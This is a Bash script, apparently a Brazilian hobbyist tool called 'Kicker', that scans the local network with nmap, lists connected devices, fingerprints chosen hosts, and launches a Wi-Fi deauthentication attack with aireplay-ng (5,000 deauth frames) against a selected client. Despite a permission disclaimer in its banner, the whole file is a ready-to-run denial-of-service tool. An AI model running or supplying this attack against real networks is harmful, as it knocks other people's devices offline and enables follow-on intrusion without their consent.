#!/bin/bash
function print_logo(){
        echo -e "\033[01;32m"       
        echo "
 ____             ____   ____     _     _  ___      _             
|  _ \  _____   _|  _ \ / ___|   | |   | |/ (_) ___| | _____ _ __ 
| | | |/ _ \ \ / / |_) | |  _    | |   | ' /| |/ __| |/ / _ \ '__|
| |_| |  __/\ V /|  __/| |_| |   | |___| . \| | (__|   <  __/ |   
|____/ \___| \_/ |_|    \____|___|_____|_|\_\_|\___|_|\_\___|_|   
                            |_____|

        "
	echo " ==============================[ KICKER ]=============================="
       	echo "     - Utilize apenas para fins diplomaticos !"
	echo "     - 'Com grandes poderes vem grandes responsabilidades!' - Stan Lee"
	echo "     - Script desenvolvido por: DevPG"
	echo "     - Instagram: @pgdogas"
	echo "     - VersÃ£o do script: 2.0"
	echo "     - Finalidade objetiva: Expulsar intrusos com permissÃ£o do responsavel pela rede"
	echo "obs: Certifique-se que voce tem permissÃ£o para executar esta ferramenta"
	echo " ==============================[ KICKER ]=============================="
	 echo -e "\033[01;35m"
}
clear
print_logo
setterm -foreground red
echo "  [!]  Este script foi criado e testado em sistema baseado em debian, nÃ£o hÃ¡ testes realizados em outros sistemas !"
echo "  [!]  Certifique-se de que nÃ£o tenha outra interface ligada em seu sistema"
echo "  [!]  Para desativar uma interface momentaneamente execute: ifconfig wlanX down"
echo "  [!]  Dependencias: nmap, aircrack-ng."
echo -e "\n\n\n"
echo " [...] -> Obtendo gateway padrÃ£o..."
ifconfig | grep "inet 192" > local_ip.txt
sed 's/inet.*broadcast/->/' local_ip.txt > local_ip2.txt
sed -e 's/ //g' local_ip2.txt > local_ip.txt
cut -c3-12 local_ip.txt > local_ip2.txt
sed 's/$/0-24/' local_ip2.txt > local_ip.txt
sed -r -e 's/[-]+/\//g' local_ip.txt > local_ip2.txt
setterm -foreground green
echo " [!] -> Gateway obtido!"
setterm -foreground white
echo " [...] -> Analisando REDE Aguarde!"
lip=$(cat local_ip2.txt) 
function load_clients(){
	nmap -sP $lip > scan_out.txt
	grep "MAC" scan_out.txt > clients.txt
	grep "Nmap scan report for" scan_out.txt | sed 's/Nmap.*for //' > clients_ips.txt
	cut -c13-99 clients.txt
	cut -c14-30 clients.txt > readmacs.txt
}
load_clients
setterm -foreground yellow
echo " [...] -> Inicializando Kicker..."
ping 127.0.0.1 -c 3 > dumps.txt 
macs=("1" "0")
clear
router_mac="" 
function get_routermac(){
	iwconfig | grep Access | sed -e 's/Mode.*nt://g' | grep : > lomac.txt
	sed -e 's/ //g' lomac.txt  > mac.txt
	router_mac=$(cat mac.txt)
}
get_routermac
card_name="wlan0"
mac="null"
x=0; 
function show_macs(){
x=0
RES_ADDRES=("-","-")
addr_count=0
ip_to="192.168.0.1"
desc_count=0
address_now="null"
description="null"
addres_description=("Desconhecido","Desconhecido")
for line in $(cat clients_ips.txt)
do
	RES_ADDRES[$addr_count]="$line"
	let "addr_count = addr_count + 1"
done
for line in $(cat clients.txt | sed 's/MA.* (//g' | sed 's/ .*)//g' | sed 's/)//g')
do
	addres_description[desc_count]="$line"
	let "desc_count = desc_count +1"
done
setterm -foreground white
for line in $(cat readmacs.txt) 
do 
	macs[$x]="$line"
	address_now=${RES_ADDRES[$x]}
	description=${addres_description[$x]}
	echo -e "\033[01;37m[\033[01;33m $x\033[01;37m ] - $line \033[01;33mENDERECO_IP: -> \033[01;32m[ $address_now ]\033[01;35m - $description" 
	let "x = x + 1"
done
if [ $(grep -c "." clients_ips.txt) -lt 2 ]
	then
		echo -e "\033[01;32m [...] -> Executando nova tentativa obter os UP HOSTS da rede..."
		load_clients
		show_macs
else
	echo -e "\033[01;33m [!] -> Clientes carregados com sucesso!"
fi
}
airmon-ng stop wlan0mon
airmon-ng stop wlan1mon
clear
print_logo
echo "[?] -> Qual placa wireless usar ?(default: wlan0 / wlan0mon)"
setterm -foreground white
read card
if [ $card != "" ]
	then
		card_name=$card
		echo -e "\033[01;33m [!] -> O nome da placa sera utilizado como: $card / ${card}mon" 
	else
		echo -e "\033[01;33m [!] -> O nome da placa sera utilizado como: $card / ${card}mon" 
fi
show_macs
function get_nmap(){
	echo " [!] -> EndereÃ§o em analise: $ip_to"
	nmap -O -Pn $ip_to > scan_out.txt
	cat scan_out.txt | grep "Device"
	cat scan_out.txt | grep "Running"
	cat scan_out.txt | grep "OS "
	cat scan_out.txt | grep "open"
}
function ask(){
	echo "[?] -> Escolha um cliente para deautenticar! (99 para sair)"
	read ddos
	if [ $ddos == 99 ]
		then
			airmon-ng stop "$card_name"mon
			clear
			print_logo
			setterm -foreground red
			echo "=== [ Finalizando o Script ]==="
			ping 127.0.0.1 -c 3 > dump.txt
			clear
			rm dump.txt
			rm dumps.txt
			rm execute.sh
			rm lomac.txt
			rm readmacs.txt
			rm mac.txt
			rm clients.txt
			rm local_ip.txt
			rm local_ip2.txt
			rm clients.txt
			exit
	fi
	if [ $ddos == 777 ]
		then
			echo "[?] -> Qual EndereÃ§o voce quer analisar ? [0 ~ $x]"
			read lets_get
			if [ $lets_get -lt $x ]
				then
					ip_to=${RES_ADDRES[$lets_get]}
					get_nmap
			fi
	else 
		if [ $ddos -gt $x]
		then
			clear
			show_macs
			echo " [!] -> Escolha um valor valido!"
			ask
		else
			mac="${macs[$ddos]}"
			echo " [!] -> Executando ataque contra ID: $ddos -> ( $mac )"
			if [ $($router_mac | grep -c ":") == 0 ]
				then
					echo " [...] -> Tentando obter mac do roteador !"
					get_routermac
			fi
			clear
			print_logo
			setterm -foreground white
			echo " [!] -> Executando ataque contra ID: $ddos -> ( $mac )"
			echo " [!] -> GATEWAY_MAC : $router_mac"
			if [ $(iwconfig | grep -c "0mon") == 0 ]
			then
				airmon-ng start $card_name > dump.txt
				echo " [!] -> HABILITADO MODO MONITORAMENTO PARA $card_name !"
			fi
			setterm -foreground red
			echo " [...] -> Iniciando o ataque..."
			ping 127.0.0.1 -c 2 > dumps.txt
			clear
			setterm -foreground green
			print_logo
			setterm -foreground red
			echo " [!] -> Para parar o ataque pressione CTRL-C!"
			echo ""
			ping -c 3 127.0.0.1 > dump.txt
			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac "$card_name"mon" >> execute.sh
			chmod +x execute.sh > dump.txt
			gnome-terminal -- "./execute.sh" > dump.txt
			setterm -foreground white
			show_macs
			ask
	fi
	fi
}
ask
